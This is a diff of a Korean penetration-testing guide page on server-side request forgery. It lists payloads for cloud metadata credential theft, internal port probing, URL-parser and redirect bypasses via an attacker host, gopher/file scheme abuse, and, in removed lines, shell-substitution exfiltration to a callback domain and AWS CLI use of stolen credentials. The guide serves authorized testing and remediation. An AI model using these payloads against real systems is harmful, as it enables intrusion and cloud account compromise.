@@ -1,41 +1,25 @@
 ---
 sidebar_position: 13
-title: 서버 사이드 요청 위조 (SSRF)
-description: 웹 진단 - Server-Side Request Forgery 점검 절차, 클라우드 메타데이터 페이로드, Blind SSRF, 보고서 양식
-keywords: [SSRF, Server-Side Request Forgery, Blind SSRF, IMDS, AWS 메타데이터, Burp Collaborator, OWASP A05]
+title: SSRF
+description: 웹 진단 - Server-Side Request Forgery 진입점, 응답 판단, 내부망/metadata 접근, 우회 노트
+keywords: [SSRF, Server-Side Request Forgery, Blind SSRF, IMDS, metadata, internal network, OWASP A05]
 draft: false
 ---
 
-# 서버 사이드 요청 위조 (Server-Side Request Forgery, SSRF)
-
-> 서버가 공격자가 제어한 URL로 임의 요청을 보내게 만드는 취약점.
-> **클라우드 자격증명 탈취 / 내부망 접근 / 관리자 페이지 직접 호출**로 이어지며, 클라우드 환경에서는 단일 결함만으로 계정 단위 침해가 가능한 고위험 항목.
-
-## 점검 개요
-
-| 항목 | 내용 |
-| :--- | :--- |
-| **분류** | OWASP A05:2025 - Injection (2021의 A10 SSRF가 2025에서 Injection 카테고리로 통합) / KISA 입력값 검증 |
-| **CWE** | [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html) |
-| **영향도** | 🔴 매우 높음 (클라우드 IMDS 노출 시) / 🟡 중간 (외부 인터넷만 접근, 내부망/IMDS 차단 시) |
-| **점검 난이도** | 하 (응답 노출형) / 상 (Blind + IMDSv2 환경) |
-| **예상 점검 시간** | 파라미터당 30분 ~ 4시간 |
-
----
+# 서버 사이드 요청 위조 (SSRF)
 
 ## 점검 목적
 
-URL을 입력값으로 받는 기능에서, 입력된 URL의 **도메인/IP/프로토콜이 검증되지 않고** 서버가 그대로 요청을 발생시키는지 확인한다. 성공 시 **AWS/GCP/Azure 메타데이터 엔드포인트에서 IAM 자격증명 탈취**, **외부에서 접근 불가능한 내부 관리자 페이지 호출**, **로컬 파일 읽기(`file://`)** 가 가능하다.
-
----
+사용자 입력값이 서버 측 HTTP client, URL fetcher, headless browser, webhook 검증 로직에 그대로 들어가는지 확인. 성공 시 서버 위치에서 외부/내부 URL 요청, 내부망 서비스 접근, cloud metadata credential 조회, 로컬 파일/비HTTP protocol 접근이 가능함.
 
 ## 유형 구분
 
-| 유형 | 특징 | 판정 방법 |
+| 유형 | 특징 | 실무 판단 |
 | :--- | :--- | :--- |
-| **Basic (In-band)** | 서버가 fetch한 응답이 그대로 클라이언트에 노출 | 응답 본문에서 fetch된 페이지 직접 확인 |
-| **Semi-Blind** | 응답 본문은 없지만 상태코드 / 응답 길이 / 응답 시간 차이 | 200 vs 4xx, 응답 시간으로 내부 포트 식별 |
-| **Blind** | 어떤 흔적도 없음 | OOB 콜백 (Burp Collaborator) 으로만 입증 |
+| **In-band** | 서버가 가져온 응답이 클라이언트 응답에 섞여 나옴 | 외부 페이지, localhost, metadata 응답이 화면/API에 보이는지 확인 |
+| **Semi-Blind** | 응답 본문은 없지만 status/length/time 차이가 남음 | 내부 포트별 timeout, 200/403/500, 응답 시간 차이 비교 |
+| **Blind** | 응답 차이는 없고 외부 콜백만 확인됨 | Collaborator/interactsh 요청의 DNS/HTTP 로그로 판정 |
+| **Stored/Async** | URL 저장 후 백그라운드 작업에서 요청 발생 | 저장 직후가 아니라 썸네일/검증/알림/배치 시점까지 확인 |
 
 ---
 
@@ -43,120 +27,163 @@ URL을 입력값으로 받는 기능에서, 입력된 URL의 **도메인/IP/프�
 
 ### Step 1. 진입점 식별
 
-**URL을 입력받거나 URL이 포함된 데이터를 받는 기능**을 후보로 (단순 파라미터 fuzz보다 효율적):
+URL을 직접 입력받거나, URL이 포함된 데이터를 서버가 처리하는 기능을 먼저 본다.
 
-- **이미지 / 파일 fetch** — 프로필 사진 URL 등록, 외부 이미지 미리보기, 아이콘 URL
-- **PDF / 스크린샷 변환** — URL 입력 후 서버에서 headless browser 로 렌더링
-- **Webhook 등록** — 등록 직후 서버가 검증 요청을 보내는 경우
-- **외부 API 프록시** — RSS/OEmbed/oEmbed, OpenGraph 메타 추출
-- **OAuth 콜백 URL** — 잘못 처리되면 SSRF로 발현
-- **PDF/Office 업로드** — XXE → SSRF로 이어질 수 있음 (XXE 페이지 별도 참조)
+- URL 미리보기: OpenGraph, oEmbed, RSS, link preview
+- 이미지/파일 fetch: 프로필 이미지 URL, 아이콘 URL, 외부 첨부 URL
+- 변환/렌더링: PDF 생성, 스크린샷, headless browser, HTML to image
+- Webhook: 등록/검증 요청, 알림 URL, callback URL
+- 외부 연동 테스트: Slack/Teams/webhook 테스트, API URL 테스트
+- 업로드 후처리: SVG, PDF, Office, XML 내부의 외부 참조
+- 관리자 도구: 서버 상태 체크, URL fetch, 프록시 API, 진단 기능
 
-### Step 2. 1차 탐지 (외부 콜백)
+### Step 2. SSRF 진단 루틴
 
-먼저 **공격자 제어 호스트**(Burp Collaborator) 로 요청을 유도하여, 서버가 정말 외부 요청을 발생시키는지 확인:
+Burp Repeater에서 정상 URL을 baseline으로 잡고 **외부 콜백 → 응답 노출 → 내부 주소 → metadata → 우회** 순서로 좁힌다.
 
+**1. 외부 콜백 확인**
+
+```text
+https://ssrf-<RANDOM>.<COLLAB>.oastify.com/
+http://ssrf-<RANDOM>.<COLLAB>.oastify.com/
 ```
-http://<RANDOM>.<COLLAB>.oastify.com/
+
+**2. 응답 노출형 확인**
+
+```text
+http://example.com/
+http://neverssl.com/
 ```
 
-서버 IP에서 Collaborator로 HTTP/DNS 요청이 도달하면 → SSRF 후보. 도달하지 않으면 SSRF 아니거나 출구 차단된 환경.
+**3. 내부/로컬 접근 확인**
 
-### Step 3. 내부 자원 접근 시도
-
-외부 콜백이 성공하면 내부망/로컬 접근을 시도:
-
-```
+```text
 http://127.0.0.1/
 http://localhost/
 http://[::1]/
 http://127.0.0.1:8080/
-http://192.168.1.1/
 http://10.0.0.1/
 ```
 
-응답이 외부와 다르거나 (관리자 페이지 등) 노출되면 내부망 접근 가능.
+**4. Cloud Metadata 확인**
 
-### Step 4. 클라우드 메타데이터 (최우선 확인)
-
-대상이 AWS/GCP/Azure 위에 있으면 **반드시 시도** — 발견 시 즉시 Critical:
-
-```
-# AWS (IMDSv1 — 헤더 불필요, 가장 흔한 케이스)
+```text
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# GCP (Metadata-Flavor 헤더가 있어야 응답)
-http://metadata.google.internal/computeMetadata/v1/instance/
-
-# Azure (Metadata 헤더 필요)
+http://metadata.google.internal/computeMetadata/v1/
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
 ```
 
-응답에 IAM Role 자격증명(JSON)이나 인스턴스 메타데이터가 노출되면 즉시 입증 완료.
+| 관찰 결과 | 바로 판단 | 다음 행동 |
+| :--- | :--- | :--- |
+| Collaborator에 DNS/HTTP 요청 수신 | 서버 측 fetch 후보 | source IP, User-Agent, method, header 확인 |
+| 외부 HTML이 응답에 그대로 노출 | In-band SSRF 가능성 높음 | localhost/internal/metadata로 확장 |
+| 외부 콜백은 오고 응답은 고정 | Blind SSRF 후보 | 내부 포트 time/status 차이 확인 |
+| `127.0.0.1`에서 외부와 다른 응답 | 내부 접근 가능 | 포트/서비스 fingerprinting |
+| metadata endpoint 응답 노출 | Cloud credential 영향 | role/token/계정 권한 확인 |
+| URL scheme이 제한됨 | 필터/allowlist 존재 | redirect, parser mismatch, IP 변형 확인 |
+| 브라우저 User-Agent 확인 | headless browser fetch 가능성 | HTML 렌더링, file/screenshot 영향 확인 |
 
-### Step 5. 프로토콜 / 우회 시도
+### Step 3. 컨텍스트별 빠른 선택
 
-- `file://` — 로컬 파일 읽기 가능 여부
-- 단순 도메인 차단이 있을 때 우회 (`@` 트릭, 리다이렉트 등 — 케이스 6 참조)
+입력값이 어떤 fetcher에 들어가는지 먼저 가정하고 payload를 고른다.
+
+| 입력 컨텍스트 | 먼저 넣을 값 | 볼 것 |
+| :--- | :--- | :--- |
+| 프록시 API: `url=` | `http://example.com/` | 외부 응답이 그대로 반환되는지 |
+| 이미지 URL | Collaborator URL, 작은 이미지 URL | 서버가 이미지 검증/다운로드 요청을 보내는지 |
+| Webhook URL | Collaborator URL | 등록 시점에 검증 요청이 오는지 |
+| PDF/스크린샷 URL | `http://127.0.0.1:8080/` | 렌더링 결과/에러/timeout 차이 |
+| URL allowlist | `http://allowed.com@127.0.0.1/` | parser mismatch 여부 |
+| Redirect follow | attacker URL → `Location: http://127.0.0.1/` | 서버가 redirect를 따라가는지 |
+| Async fetch | unique marker URL | 즉시 응답 이후 콜백이 늦게 오는지 |
+
+### Step 4. 내부 서비스 식별
+
+응답 본문이 보이면 내용으로, Blind면 status/length/time으로 구분한다.
+
+| 대상 | 확인 URL | 판단 |
+| :--- | :--- | :--- |
+| Local web | `http://127.0.0.1/`, `:8080`, `:8000` | admin UI, actuator, internal API |
+| Redis | `http://127.0.0.1:6379/` | protocol error, timeout 차이 |
+| Elasticsearch | `http://127.0.0.1:9200/` | cluster JSON, 401/403 |
+| Kibana | `http://127.0.0.1:5601/` | HTML title, redirect |
+| Consul | `http://127.0.0.1:8500/` | UI/API 응답 |
+| Docker API | `http://127.0.0.1:2375/version` | JSON version |
+| Spring Actuator | `http://127.0.0.1:8080/actuator/env` | env/config 노출 |
 
 ---
 
-## 페이로드 / 테스트 케이스
+## 페이로드 노트
 
-### 케이스 1: 외부 콜백 (1차 탐지)
+### 외부 콜백 / fetch 라이브러리 식별
 
-**언제 쓰는지**: SSRF 가능성 자체를 가장 빠르게 판정. 다른 모든 케이스의 전제 조건.
+가장 먼저 서버가 실제로 외부 요청을 보내는지 확인한다.
 
+```text
+http://ssrf-<RANDOM>.<COLLAB>.oastify.com/
+https://ssrf-<RANDOM>.<COLLAB>.oastify.com/pixel.png
 ```
-http://<RANDOM>.<COLLAB>.oastify.com/
-https://<RANDOM>.<COLLAB>.oastify.com/
+
+볼 것:
+
+```text
+source IP
+DNS only / HTTP까지 도달 여부
+HTTP method
+User-Agent
+X-Forwarded-For / Via
+Host header
+redirect follow 여부
 ```
 
-**판정**: Burp Collaborator(또는 interactsh) 패널에서 HTTP 요청 또는 DNS 조회가 수신되면 SSRF 가능. 요청 헤더의 User-Agent로 어떤 라이브러리가 쓰이는지(`python-requests`, `Java/`, `curl`, `PhantomJS`, `HeadlessChrome` 등) 추정 가능.
+`python-requests`, `Java/`, `Go-http-client`, `curl`, `HeadlessChrome` 같은 User-Agent가 보이면 다음 payload 선택이 쉬워진다.
 
-### 케이스 2: 내부 호스트 / 사설 IP
+### In-band 프록시 / 미리보기
 
-**언제 쓰는지**: 외부 콜백이 되면, 내부망 접근까지 가능한지 (= 화이트리스트 없음 + 내부 통신 허용) 확인.
+서버가 가져온 응답을 그대로 돌려주는 기능은 바로 내부로 확장한다.
 
+```http
+GET /api/proxy?url=http://example.com/ HTTP/1.1
+Host: <TARGET>
+
+GET /api/proxy?url=http://127.0.0.1:8080/ HTTP/1.1
+Host: <TARGET>
+
+GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+Host: <TARGET>
 ```
+
+외부 HTML이 그대로 나오면 fetch 자체는 확정이다. 내부 URL에서 HTML/JSON/에러 문자열이 달라지는지 본다.
+
+### Localhost / 사설 IP
+
+```text
 http://127.0.0.1/
-http://127.0.0.1:80/
 http://localhost/
 http://[::1]/
-
-# 사설 IP 대역 (대상 환경에 따라 시도)
-http://192.168.1.1/
+http://127.0.0.1:80/
+http://127.0.0.1:8080/
 http://10.0.0.1/
 http://172.16.0.1/
-
-# 자주 열려 있는 내부 서비스 포트
-http://127.0.0.1:8080/    # 내부 API
-http://127.0.0.1:6379/    # Redis
-http://127.0.0.1:9200/    # Elasticsearch
-http://127.0.0.1:5601/    # Kibana
-http://127.0.0.1:8500/    # Consul
+http://192.168.0.1/
 ```
 
-**판정**: 외부와 다른 응답(에러/HTML/JSON) 이 돌아오면 내부 접근 가능. 관리자 인터페이스 페이지가 그대로 노출되면 추가 임팩트.
+응답 본문이 없으면 같은 포트에 대해 status, content-length, timeout을 비교한다. 열린 포트는 빠른 실패나 다른 에러를 주고, 닫힌 포트는 timeout으로 떨어지는 경우가 많다.
 
-> 정수형 표기(`http://2130706433/`) 같은 변형은 단순 문자열 블랙리스트(`localhost`, `127.0.0.1`)만 적용된 환경에서 가끔 쓰이지만, 실무에서는 케이스 6의 `@` 트릭이나 리다이렉트가 더 자주 통함.
+### AWS Metadata
 
-### 케이스 3: AWS IMDS — 자격증명 탈취 (가장 임팩트 큰 케이스)
+IMDSv1은 GET만으로 조회된다.
 
-**언제 쓰는지**: 대상이 AWS EC2/ECS/EKS 환경(응답 헤더 `Server`, IP 대역, 도메인 등으로 추정 가능) 이면 **반드시** 시도.
-
-**IMDSv1 (헤더 불필요 — 미마이그레이션 환경 다수):**
-
-```
+```text
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
-http://169.254.169.254/latest/user-data/
 http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/user-data/
 ```
 
-**판정**: 두 번째 URL 응답이 IAM Role 이름(예: `web-server-role`) 단일 줄로 떨어지고, 세 번째에서 다음과 같은 JSON이 나오면 **Critical**:
+응답 예시:
 
 ```json
 {
@@ -168,270 +195,198 @@ http://169.254.169.254/latest/dynamic/instance-identity/document
 }
 ```
 
-이 자격증명을 `aws configure` 로 등록하면 해당 Role 권한으로 AWS API 호출 가능.
+IMDSv2는 token 발급용 `PUT`과 `X-aws-ec2-metadata-token` header가 필요하다. SSRF 진입점에서 method/header 제어가 가능하면 확인한다.
 
-**IMDSv2 (세션 토큰 필요 — 우회 난이도 높음):**
-
-대상이 IMDSv2를 강제(`HttpTokens=required`) 하면 SSRF만으로는 토큰 발급 PUT 요청과 후속 GET 요청을 모두 보낼 수 있어야 함. 보통 SSRF는 GET만 보내므로 차단됨. **IMDSv2가 강제되어 있으면 이 케이스는 사실상 차단된 것으로 보고 다음으로**.
-
-### 케이스 4: GCP / Azure 메타데이터
-
-**언제 쓰는지**: 대상이 GCP/Azure 환경일 때. 두 클라우드는 **메타데이터 응답에 특정 헤더가 필요** — 헤더 주입이 가능한 SSRF에서만 발현.
-
+```http
+PUT /latest/api/token HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token-ttl-seconds: 21600
 ```
-# GCP (Metadata-Flavor: Google 헤더 필요)
+
+단순 GET fetcher라면 IMDSv2 token 발급은 막히는 경우가 많다.
+
+### GCP / Azure Metadata
+
+GCP/Azure는 metadata header가 필요하다. SSRF 진입점에서 header를 제어할 수 있는지 먼저 본다.
+
+```text
+# GCP
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+Metadata-Flavor: Google
 
-# Azure (Metadata: true 헤더 필요)
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Azure
 http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+Metadata: true
 ```
 
-**판정**: 응답에 access_token JSON 또는 인스턴스 메타데이터가 출력되면 취약. SSRF 진입점이 헤더를 임의로 추가할 수 없는 단순 GET fetch 형태라면 이 케이스는 시도 자체가 불가 → 보고서에 사유 명시.
+header 제어가 없으면 단순 URL fetch로는 토큰 조회가 안 될 수 있다. 그래도 인스턴스 정보 endpoint가 노출되는지 확인한다.
 
-### 케이스 5: 로컬 파일 (`file://`)
+### URL Parser / Allowlist 우회
 
-**언제 쓰는지**: 라이브러리(`curl`, `libcurl`, 일부 PHP 함수, Java URL 클래스 등)가 `file://` 스킴까지 처리할 때. http/https만 허용하는 라이브러리에서는 동작 안 함.
+필터가 보이면 URL parser가 어느 기준으로 host를 보는지 흔든다.
 
-```
-file:///etc/passwd
-file:///etc/hosts
-file:///proc/self/environ
-file:///c:/windows/win.ini      (Windows 대상)
-```
-
-**판정**: 응답 본문에 파일 내용이 그대로 노출되면 취약. 단, 응답 노출이 없는 Blind SSRF에서는 입증이 어려움.
-
-### 케이스 6: 도메인 화이트리스트 우회
-
-**언제 쓰는지**: `allowed-domain.com` 같은 화이트리스트가 설정되어 있어 직접 IP/내부 호스트 요청이 차단될 때.
-
-```
-# @ 트릭 — URL 파서가 호스트를 잘못 인식
+```text
 http://allowed.com@127.0.0.1/
 http://allowed.com@169.254.169.254/latest/meta-data/
-
-# # 트릭
 http://127.0.0.1#allowed.com
-http://169.254.169.254/latest/meta-data/#.allowed.com
-
-# 서브도메인 트릭 (단순 contains 체크 우회)
+http://127.0.0.1?.allowed.com
 http://allowed.com.attacker.com/
 http://attacker.com/allowed.com
-
-# 공격자 도메인이 내부 IP로 해석되도록 DNS 설정
-http://internal.attacker.com/    (DNS A 레코드 = 127.0.0.1)
+http://127.1/
+http://2130706433/
+http://0x7f000001/
+http://0177.0.0.1/
+http://[::ffff:127.0.0.1]/
 ```
 
-**판정**: 위 페이로드 중 하나로 케이스 1~3 의 결과가 나오면 화이트리스트 우회 입증. `@` 트릭은 URL 표준상 `@` 앞은 user-info, 뒤가 호스트인데, 일부 라이브러리(특히 Java `URL`, 옛날 PHP)가 잘못 파싱.
+`@` 앞은 userinfo, 뒤가 실제 host다. 검증 로직과 fetch 라이브러리가 서로 다른 parser를 쓰면 우회가 생긴다.
 
-### 케이스 7: 리다이렉트 우회
+### Redirect 우회
 
-**언제 쓰는지**: 화이트리스트가 적용되어 있고 위의 우회도 막혔을 때. 공격자가 통제하는 외부 도메인이 `Location: http://169.254.169.254/...` 로 302 응답을 보내면, 서버가 자동 리다이렉트를 따라가는지 확인.
+검증은 최초 URL만 보고 fetcher가 redirect를 따라가면 내부 URL로 넘어갈 수 있다.
 
-```python
-# 공격자 서버 (redirect.py)
-return Response(status=302, headers={"Location": "http://169.254.169.254/latest/meta-data/"})
+```http
+HTTP/1.1 302 Found
+Location: http://169.254.169.254/latest/meta-data/
 ```
 
-요청:
-```
-http://attacker.com/redirect
-```
+요청값:
 
-**판정**: 서버 응답에 IMDS 결과가 노출되거나 Collaborator로 콜백이 도달하면 취약. (리다이렉트 비허용으로 설정된 라이브러리는 대상 아님)
-
-### 케이스 8: 포트 스캔 (Semi-Blind)
-
-**언제 쓰는지**: 응답 본문은 안 노출되지만 응답 시간/상태코드/응답 길이가 다를 때. 내부 서비스 발견 목적.
-
-```
-http://127.0.0.1:22/
-http://127.0.0.1:80/
-http://127.0.0.1:3306/
-http://127.0.0.1:6379/
-http://127.0.0.1:8080/
+```text
+http://attacker.example/redirect-to-metadata
 ```
 
-**판정**: 열린 포트(빠른 응답, 다른 상태코드/길이) 와 닫힌 포트(타임아웃, 일정한 에러) 구분 가능하면 취약. 발견된 내부 서비스는 추가 점검 대상.
+확인은 최종 응답이 metadata/internal 응답으로 바뀌는지, 또는 Collaborator 로그에서 2차 요청이 발생하는지 본다.
 
-### 케이스 9: Blind SSRF 입증
+### file / gopher / dict Scheme
 
-**언제 쓰는지**: 응답에 어떤 흔적도 없는데 외부 콜백만 도달할 때. PoC를 위해서는 **OOB 채널로 데이터까지 빼낼 수 있음**을 보여야 설득력 있음.
+라이브러리가 HTTP 외 scheme을 처리할 때만 의미가 있다.
 
+```text
+file:///etc/passwd
+file:///proc/self/environ
+file:///c:/windows/win.ini
+dict://127.0.0.1:6379/info
+gopher://127.0.0.1:6379/_INFO%0d%0a
 ```
-# 호스트명 prefix에 데이터 실어 보내기 (DNS 채널)
-http://`hostname`.<COLLAB>.oastify.com/
-http://$(whoami).<COLLAB>.oastify.com/
-```
 
-서버 측 처리에 셸 평가가 들어가면 위처럼 데이터 추출 가능. 그 외에는 단순 콜백만 입증하고, 영향도는 "내부 통신 가능 + 자격증명/내부자원 잠재 노출" 수준으로 보고.
+`file://` 응답이 그대로 나오면 로컬 파일 읽기다. `gopher://`는 내부 서비스에 raw payload를 보낼 수 있을 때 영향이 커진다.
 
-> 참고: gopher 프로토콜로 내부 Redis/Memcached에 쓰기 명령을 보내 RCE까지 이어지는 케이스가 리서치 자료에 자주 등장하지만, 실무 환경에서는 발견 빈도가 낮음. 발견 시 영향도는 Critical.
+---
+
+## 필터 / 우회 매트릭스
+
+| 필터 증상 | 우회 방향 | 예시 |
+| :--- | :--- | :--- |
+| `localhost`, `127.0.0.1` 차단 | IP 변형, IPv6 | `127.1`, `2130706433`, `[::1]` |
+| 사설 IP 차단 | DNS rebinding, attacker DNS | `internal.attacker.com` → `127.0.0.1` |
+| allowlist 도메인만 허용 | userinfo, subdomain, redirect | `allowed.com@127.0.0.1`, `allowed.com.attacker.com` |
+| http/https만 허용 | redirect로 scheme 전환 | `https://attacker/302-to-file` |
+| 응답 본문 미노출 | status/time/length 비교 | 내부 포트별 timeout 차이 |
+| metadata 차단 | redirect, IPv6/alias, header 제어 확인 | IMDSv2 token/header 가능 여부 |
+| DNS만 도달 | Blind SSRF로 판단 | Collaborator DNS 로그 기준 |
 
 ---
 
 ## 취약 판정 기준
 
-다음 중 **하나라도** 해당하면 취약:
+다음 중 하나라도 안정적으로 재현되면 취약으로 본다.
 
-- [ ] Burp Collaborator로 **HTTP/DNS 콜백이 수신**됨 (외부 요청 발생 자체 확인)
-- [ ] `127.0.0.1` 또는 사설 IP 요청 시 외부와 **다른 응답**(내부 페이지/에러) 이 노출됨
-- [ ] 클라우드 메타데이터 엔드포인트(`169.254.169.254`, `metadata.google.internal`) 에서 **IAM 자격증명 또는 인스턴스 메타데이터**가 응답됨
-- [ ] `file://` 스킴으로 로컬 파일 내용이 응답에 노출됨
-- [ ] 화이트리스트가 있어도 `@` 트릭 / 리다이렉트로 우회 가능
-- [ ] 내부 포트별로 응답 시간 / 상태코드 차이가 있어 포트 스캔 가능
+- [ ] 서버에서 Collaborator/interactsh로 DNS 또는 HTTP 요청이 발생함
+- [ ] 서버가 가져온 외부 응답이 클라이언트 응답에 노출됨
+- [ ] `127.0.0.1`, 사설 IP, 내부 도메인에서 외부와 다른 응답이 확인됨
+- [ ] cloud metadata endpoint에서 role, token, instance document, credential이 노출됨
+- [ ] 내부 포트별 status/time/length 차이로 서비스 식별이 가능함
+- [ ] allowlist가 `@`, redirect, IP 변형, DNS rebinding으로 우회됨
+- [ ] `file://` 또는 비HTTP scheme으로 로컬 파일/내부 서비스 접근이 가능함
 
-**오탐 주의 (다음은 SSRF 아님 또는 별도 분류):**
+다음은 후보 또는 보류로 둔다.
 
-- [ ] 정상적인 외부 fetch 기능에서 외부 콜백만 발생 (단, 화이트리스트 미적용은 별도 결함으로 분류)
-- [ ] 클라이언트 측 JS에서 fetch가 일어나는 경우 (서버에서 발생해야 SSRF)
-- [ ] Open Redirect — 외부 리다이렉트만 가능하고 서버가 fetch하지 않으면 별도 결함(Open Redirect)
+- [ ] 클라이언트 브라우저에서만 요청이 발생함
+- [ ] 정상 URL fetch 기능에서 외부 요청만 가능하고 내부/metadata 접근이 차단됨
+- [ ] OOB 콜백은 있으나 모든 입력에서 고정된 health check가 발생함
+- [ ] Open Redirect만 가능하고 서버 측 fetch가 없음
 
----
+영향도가 올라가는 조건:
 
-## PoC 양식 (보고서 붙여넣기용)
-
-**[SSRF - AWS IMDS 자격증명 탈취] - 프로필 이미지 URL 등록 기능**
-
-1. `<TARGET>` 로그인 후 마이페이지 → 프로필 이미지 URL 등록 화면 이동
-2. 이미지 URL 입력란에 AWS IMDS 엔드포인트를 입력
-3. 등록 직후 서버가 해당 URL로 요청을 보내는 응답에서 IAM Role 자격증명 노출 확인
-
-**요청 (Request):**
-
-```http
-POST /api/profile/avatar HTTP/1.1
-Host: <TARGET>
-Cookie: SESSION=abcd1234
-Content-Type: application/json
-
-{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role"}
-```
-
-**응답 (Response) — 취약 발현 증거:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: application/json
-
-{
-  "preview": "{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"ASIAEXAMPLEKEY\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI...EXAMPLEKEY\",\n  \"Token\": \"IQoJb3JpZ2luX2VjE...EXAMPLE\",\n  \"Expiration\": \"2026-05-12T18:00:00Z\"\n}"
-}
-```
-
-**확인 사항:**
-- `AccessKeyId`, `SecretAccessKey`, `Token` 이 응답에 그대로 노출됨
-- 동일 자격증명을 `aws configure set aws_session_token` 으로 설정 후 `aws sts get-caller-identity` 호출 시 `arn:aws:sts::123456789012:assumed-role/web-server-role/...` 응답 확인 (별첨 스크린샷)
-- 추가 검증: `aws s3 ls`, `aws iam get-user` 등으로 Role 권한 범위 확인 필요
+- [ ] cloud credential을 획득하고 API 호출 가능
+- [ ] 내부 관리자/API/actuator/metadata 응답이 노출됨
+- [ ] 내부 포트 스캔으로 서비스 지도가 만들어짐
+- [ ] file/gopher 등으로 로컬 파일 또는 내부 서비스 조작 가능
+- [ ] Stored/Async 경로에서 관리자 권한 작업자가 트리거함
 
 ---
 
-## 영향도 분석
+## 블라인드 모의해킹 확장
 
-- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — 클라우드 IAM 자격증명, 내부 관리자 페이지, 로컬 파일 노출.
-- **무결성 (Integrity)**: 🟡 ~ 🔴 — 자격증명 탈취 시 클라우드 리소스 변조/삭제 가능. 내부 쓰기 가능 서비스(Redis/Elasticsearch) 호출 시 데이터 조작.
-- **가용성 (Availability)**: 🟡 — 내부 서비스 부하/포트 스캔으로 성능 영향 가능.
-- **추가 위협**:
-  - **클라우드 계정 단위 침해** — 탈취한 IAM Role 권한이 넓으면 다른 서비스(S3, RDS, EC2 등) 까지 접근
-  - **내부 관리자 페이지 직접 호출** — 외부에서 접근 불가능한 어드민 기능 실행
-  - **2차 공격 진입점** — 내부 서비스 발견 후 별도 취약점(미인증 API 등) 결합 공격
+취약점 진단에서는 콜백 수신이나 내부 응답 차이로 멈추지만, 블라인드 모의해킹에서는 **서버 위치에서 접근 가능한 내부 자산과 credential 사용 가능성**까지 확인한다.
 
-**비즈니스 임팩트:**
-클라우드 환경의 SSRF는 사실상 **계정 단위 침해**로 직결된다. IAM Role 권한이 넓을수록 영향이 기하급수적으로 커지며(`*:*` 정책이라면 전 인프라), 메타데이터에서 user-data 스크립트에 하드코딩된 자격증명까지 노출되는 사례도 있다. 실무 진단에서 **IMDS 노출 SSRF 1건은 무조건 Critical**로 분류.
+| 단계 | 확인할 것 | 증거 기준 |
+| :--- | :--- | :--- |
+| 1. 요청 주체 | source IP, User-Agent, VPC/NAT 위치 | Collaborator 로그, cloud IP 대역 |
+| 2. 내부 자산 | localhost, 사설 IP, 내부 DNS, 관리 포트 | status/length/time, 응답 샘플 |
+| 3. Metadata credential | cloud role, token, temporary credential | role name, credential JSON |
+| 4. Credential 사용 | cloud/API 권한으로 실제 조회 가능 여부 | caller identity, bucket/list/read 권한 |
+| 5. 체인 확장 | 내부 API, actuator, Redis/ES/Consul 등 | 인증 우회, config/secret 노출 |
 
----
+### Cloud Credential 사용 확인
 
-## 대응방안
+AWS metadata credential이 나오면 role 권한을 바로 확인한다.
 
-### 개발자 관점 (필수)
-
-1. **URL 화이트리스트 (도메인 정확 매칭)** — 블랙리스트 방식은 우회 패턴이 너무 많아 부적합:
-
-   ```python
-   ALLOWED_DOMAINS = {"img.example.com", "cdn.example.com"}
-   parsed = urlparse(user_url)
-   if parsed.hostname not in ALLOWED_DOMAINS:
-       raise ValueError("not allowed")
-   ```
-
-2. **DNS 해석 후 IP 검증** — 화이트리스트 도메인이라도, 해당 도메인이 사설 IP로 해석되면 차단:
-
-   ```python
-   import socket, ipaddress
-
-   def safe_resolve(host: str) -> str:
-       ip = socket.gethostbyname(host)
-       addr = ipaddress.ip_address(ip)
-       if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved:
-           raise ValueError("private IP not allowed")
-       return ip
-   ```
-
-3. **검증한 IP로 직접 연결** — 도메인을 한 번 더 resolve하면 DNS Rebinding으로 우회될 수 있으므로, 검증한 IP를 그대로 사용해 연결.
-
-4. **프로토콜 제한** — `http`, `https` 만 허용. `file`, `gopher`, `dict`, `ldap`, `ftp` 차단:
-
-   ```python
-   if parsed.scheme not in {"http", "https"}:
-       raise ValueError("scheme not allowed")
-   ```
-
-5. **리다이렉트 비허용 또는 재검증** — 라이브러리 옵션으로 자동 리다이렉트 끄거나, 리다이렉트 URL을 위 검증 로직에 다시 통과시킴:
-
-   ```python
-   requests.get(url, allow_redirects=False)
-   ```
-
-6. **응답을 그대로 반환하지 말 것** — 반환해야 한다면 Content-Type 검증(이미지면 `image/*` 만 허용 등) 후 재인코딩.
-
-### 운영자 관점
-
-1. **AWS IMDSv2 강제** — 인스턴스 단위로 `HttpTokens=required` 설정. EKS는 노드 그룹 launch template에서 설정. **이거 하나만으로 SSRF→IMDS 케이스 대부분이 차단**되므로 우선순위 최상.
-
-2. **메타데이터 hop limit 축소** — `HttpPutResponseHopLimit=1` 로 컨테이너에서 호스트 IMDS 접근 차단.
-
-3. **IAM 최소 권한 원칙** — 인스턴스 Role 권한을 필요 최소로. 와일드카드 정책(`*`) 금지. EKS는 IRSA(IAM Roles for Service Accounts) 로 Pod 단위 권한 분리.
-
-4. **출구 트래픽 제어** — 어플리케이션이 발생시키는 outbound 트래픽을 NAT/방화벽에서 화이트리스트화. 메타데이터 IP(`169.254.169.254`) 접근을 어플리케이션 단위로 차단할 수 있는 환경이면 차단.
-
-### 안전 / 위험 코드 비교
-
-```python
-# 위험 — 사용자 입력 URL을 그대로 fetch
-import requests
-def get_preview(user_url: str):
-    return requests.get(user_url).text
-
-# 안전 — 도메인 화이트리스트 + IP 검증 + 프로토콜 제한 + 리다이렉트 차단
